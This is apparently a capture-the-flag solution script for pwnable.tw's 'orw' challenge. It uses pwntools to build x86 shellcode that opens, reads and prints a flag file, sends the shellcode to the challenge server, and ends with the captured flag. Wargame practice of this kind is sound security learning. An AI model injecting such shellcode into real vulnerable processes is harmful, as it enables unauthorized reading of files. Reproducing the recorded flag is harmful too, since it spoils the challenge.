#!/bin/python

from pwn import *

push_end = """
xor eax, eax
push eax
"""

path = "///home/orw/flag"

assert len(path) % 4 == 0

pusher = [ hex(ord(x))[2:] for x in path[::-1] ]

push_part = ""
for i in range(int(len(path)/4)):
    integer = "".join(pusher[4*i:4*(i+1)])
    push_part += "push 0x{part}\n".format(part=integer)

open_call = """
mov eax, 0x5
mov ebx, esp
xor ecx, ecx
xor edx, edx
int 0x80
"""
# The result is in the eax register

open_code = push_end + push_part + open_call

read_code = """
mov ebx, eax
mov eax, 0x3
mov ecx, esp
mov edx, 0x30
int 0x80
"""

write_code = """
mov eax, 0x4
mov ebx, 0x1
mov edx, 0x30
int 0x80
"""

shellcode = open_code + read_code + write_code

print(shellcode)

shellcode_bin = asm(shellcode)

with open("shellcode.bin","wb") as f:
    f.write(shellcode_bin)


r = remote("chall.pwnable.tw",10001)

print(r.readuntil(":").decode())

r.send(shellcode_bin)

print(r.read())

r.close()

# FLAG{sh3llc0ding_w1th_op3n_r34d_writ3}